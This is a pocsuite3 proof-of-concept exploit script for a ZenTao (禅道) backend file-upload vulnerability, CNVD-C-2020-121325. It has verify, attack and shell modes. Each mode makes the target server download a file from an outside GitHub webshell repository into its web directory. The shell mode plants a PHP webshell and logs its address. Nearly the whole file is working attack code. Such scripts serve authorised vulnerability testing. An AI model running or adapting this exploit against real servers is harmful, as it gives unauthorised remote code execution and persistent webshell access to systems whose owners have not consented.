# encoding: utf-8
# Author    : Sma11stu
# Datetime  : 2021/5/12 22:41
# Product   : PyCharm
# Project   : pocsuite3
# File      : zantaopms_CNVD_C_2020_121325_upload.py
# explain   : 文件说明
import base64
from collections import OrderedDict
from pocsuite3.lib.core.interpreter_option import OptString
from pocsuite3.api import Output, POCBase, register_poc, requests, logger, POC_CATEGORY, OptDict, VUL_TYPE
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = 'xxx'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2021-05-12'
    createDate = '2021-05-12'
    updateDate = '2021-05-12'
    references = ['https://paper.seebug.org/705/']
    name = 'CNVD-C-2020-121325 禅道后台文件上传漏洞'
    appPowerLink = ''
    appName = 'zantaopms'
    appVersion = '<= 12.4.2'
    vulType = VUL_TYPE.UPLOAD_FILES
    desc = '''
        CNVD-C-2020-121325 禅道后台文件上传漏洞
    '''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        o["zentaosid"] = OptString('', description='这个poc需要zentaosid', require=True)
        return o

    def _verify(self):
        result = {}
        random_uri = random_str(16)
        try:
            verify_payload = 'HTTPS://raw.githubusercontent.com/5huai/webshell/main/php_verify.txt'
            base64_payload = base64.b64encode(verify_payload.encode())
            verify_content = base64_payload.decode()
            verify_url = self.url + '/index.php?m=client&f=download&version='+ random_uri +'&link=' + verify_content
            logger.info(verify_url)
            cookies = {
                "zentaosid": self.get_option("zentaosid")
            }
            down_res = requests.get(verify_url,cookies=cookies)
            verify_info_url = self.url + '/data/client/'+random_uri+'/php_verify.txt'
            verify_res = requests.get(verify_info_url,cookies=cookies)
            if verify_res.status_code ==200 and "md5('3.1416');" in verify_res.content.decode() :
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = verify_info_url
                result['VerifyInfo']['Payload'] = verify_payload
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _attack(self):
        result = {}
        random_uri = random_str(16)
        try:
            attack_payload = 'HTTPS://raw.githubusercontent.com/5huai/webshell/main/php_attack.php'
            base64_payload = base64.b64encode(attack_payload.encode())
            attack_content = base64_payload.decode()
            attack_url = self.url + '/index.php?m=client&f=download&version='+ random_uri +'&link=' + attack_content
            logger.info(attack_url)
            cookies = {
                "zentaosid": self.get_option("zentaosid")
            }
            down_res = requests.get(attack_url,cookies=cookies)
            attack_info_url = self.url + '/data/client/'+random_uri+'/php_attack.php'
            attack_res = requests.get(attack_info_url,cookies=cookies)
            if attack_res.status_code ==200 and "d4d7a6b8b3ed8ed86db2ef2cd728d8ec" in attack_res.content.decode() :
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = attack_info_url
                result['VerifyInfo']['Payload'] = attack_payload
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def _shell(self):
        result = {}
        random_uri = random_str(16)
        try:
            shell_payload = 'HTTPS://raw.githubusercontent.com/5huai/webshell/main/php_shell.php'
            base64_payload = base64.b64encode(shell_payload.encode())
            shell_content = base64_payload.decode()
            shell_url = self.url + '/index.php?m=client&f=download&version='+ random_uri +'&link=' + shell_content
            print(shell_url)
            cookies = {
                "zentaosid": self.get_option("zentaosid")
            }
            down_res = requests.get(shell_url,cookies=cookies)
            shell_info_url = self.url + '/data/client/'+random_uri+'/php_shell.php'
            logger.info("webshell地址：" + shell_info_url)
            shell_res = requests.get(shell_info_url,cookies=cookies)
        except Exception as e:
            logger.warn(str(e))
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

register_poc(DemoPOC)